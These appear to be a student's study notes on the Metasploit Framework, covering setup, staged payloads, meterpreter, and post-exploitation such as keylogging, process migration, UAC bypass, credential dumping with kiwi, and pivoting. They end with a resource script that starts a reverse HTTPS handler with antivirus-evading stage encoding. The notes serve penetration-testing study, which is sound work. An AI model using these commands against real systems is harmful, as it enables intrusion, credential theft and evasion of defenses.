#post-exploitation frameworks include Core Impact, Cobalt Strike and PowerShell #Empire. 

# Metasploit user interfaces and setup
1. msf relies on a *postgresql* service that needs to be started using **systemctl start postgresql**.  Then you can enable it at boot using **systemctl enable postgresql** 
2. Next, create and initialize the #msfDatabase using **msfdb init**.  Remember to update this often as msf is often updated (**apt update; apt install metasploit-framework**)

## msf Syntax 

## msf DB access

## Auxiliary #modules

Modules all follow a common slash-delimited hierarchical syntax (***module type/os, vendor, app, or protocol/module name***)

- Use the **show auxiliary** command to list all auxiliary modules.  you can also use the **search** function, complete with GoogleDorks..

# Exploit modules
Can use the **check** command to verify whether or no thte target host and application are vulnerable to a given exploit

# msf payloads
## Staged versus non-staged

### Staged (/)
A #staged payload is sent in two parts.  The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

This type of payload is useful if : 
- The vulnerability we are exploiting does not have enough buffer space to hold a full payload
- AV evasion, as the shellcode is retrieved later and injected directly into the victim machine's #memory.

### Non-staged ( _ ) 
A #non-staged payload is sent in its entirety along with the exploit.

## #meterpreter payloads
Meterpreter is a mutli-function payload that cae dynamically extended at run-time, making it a more function-rich tool than a regular command shell. 

Useful commands include **sysinfo**, **getuid**, **upload**, **download**, and **shell** 

## msf exploit #multi/handler
Works for all single- and multi-stage payloads.  When using the **use multi/handler** option, you must set a payload type !

When running the exploit, use the **exploit -j** flag to run the module as a #background job.

## Client-side attacks
Review executable #formats with teh **msfvenom -l formats** command.

## Advanced features and transports
show advanced options using teh **show advanced** command.
Common features include #stageEncoding
- **set EnableStageEncoding true**
	- **set StageEncoder x86/shikata_ga_nai** 
- **set AutoRunScript windows/gather/enum_logged_on_users** 
- Use the **background** command to return to the msfconsole prompt.  List all available #sessions wiht **sessions -l** and jump back into a session with **sessions -i** (interact) followed by hte respective session ID.

# Building our own msf module

# Post-ex with msf
This includes gathering information, gaining persistence, and pivoting.

## Core #post-exploitation features
Available from meterpreter : 
- **screenshot** 
- #keylogger
	- **keyscan_start**, **keyscan_dump**, **keyscan_stop**
	- Must take into account the context of the current meterpreter session.  In order to capture key strokes from a regular user, we will have to #migrate our shell process to the user context we are targeting.

## Process #migration
Use the **migrate** command to move the execution of meterpreter to a different process. Do this by running **ps** to see all the running processes, then picking one and issuing the **migrate** command.

## #Post-exploitation modules
#UAC bypass
- If the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we bypass #UAC

We can also load extensions directly inside the active session wiht the **load** command - 
- notably, the #PowerShell extension enables the use of PowerShell (**load powershell**, followed by **help powershell**)

Mimikatz also has an implemention of a meterpreter extension.  Run it using **load kiwi** from the meterpreter session.  
- Use the **getsystem** command to acquire system privs from our current high-integrity shell, then dump the system creds with **creds_msv**

## #Pivoting with msf
The most basic way to do this is to use the **route add** command to create a path to the alternate internal network subnet, as well as the session ID this route applies to (**route add 192.168.1.0/24 11**).
- once this is done ,you can enumerate this internal network using the **portscan/tcp** module
- As an alternative to adding routes manually, we can use the **autoroute** #post-exploitation module, which can set up pivot routes through an existing meterpreter session automatically.

# Metasploit automation
Metasploit can achieve even further automation by leveraging Metasploit #resourceScripts .
- use a standard editor to create a script in the home directory.  For this example, **setup.rc**. 
	``use exploit/multi/handler ``
	``set PAYLOAD windows/meterpreter/reverse_https ``
	``set LHOST 10.11.0.4`` 
	``set LPORT 443 ``
	``set EnableStageEncoding true ``
	``set StageEncoder x86/shikata_ga_nai ``
	``set AutoRunScript post/windows/manage/migrate``
	``set ExitOnSession false`` 
	``exploit -j -z``
- After saving the script, we can execute it by passing the **-r** flag to **msfconsole** (**sudo msfconsole -r setup.rc**)